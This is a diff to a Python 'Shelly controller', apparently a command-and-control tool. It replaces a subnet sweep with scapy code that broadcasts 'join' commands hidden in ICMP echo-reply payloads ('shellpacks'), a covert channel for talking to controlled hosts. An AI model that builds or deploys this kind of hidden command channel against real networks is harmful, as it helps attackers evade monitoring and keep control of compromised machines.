@@ -5,7 +5,7 @@ Shelly controller
 Vaughn Woerpel (vaughnw128/apicius)
 """
 
-from scapy.all import sniff
+from scapy.all import sniff, IP, Ether, ICMP, Raw, sr
 from lib.shlib import Host
 from columnar import columnar
 from tinydb import TinyDB, Query
@@ -223,17 +223,23 @@ class Controller(Host):
             print(f"Broadcasted to {target['ip']}")
 
     def connect(self) -> None:
-        base_ip = self.ip.split(".")
-        base_ip = f"{base_ip[0]}.{base_ip[1]}.{base_ip[2]}."
+        # base_ip = self.ip.split(".")
+        # base_ip = f"{base_ip[0]}.{base_ip[1]}.{base_ip[2]}."
 
-        existing_ips = [target['ip'] for target in self.db.all() if target['status'] == "CONNECTED"]
-        existing_ips.append(self.ip)
+        # existing_ips = [target['ip'] for target in self.db.all() if target['status'] == "CONNECTED"]
+        # existing_ips.append(self.ip)
 
-        for i in range(1, 256):
-            ip = base_ip + str(i)
-            if ip not in existing_ips:
-                self.send(ip, "join")
-                print(f"Connect sent to {ip}")
+        # for i in range(1, 256):
+        #     ip = base_ip + str(i)
+        #     if ip not in existing_ips:
+        #         self.send(ip, "join")
+        #         print(f"Connect sent to {ip}")
+
+        shellpacks = self.build_shellpacks("join")
+
+        for shellpack in shellpacks:
+            data = (Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+            sr(data, timeout=0, verbose=0)
         
 
     """
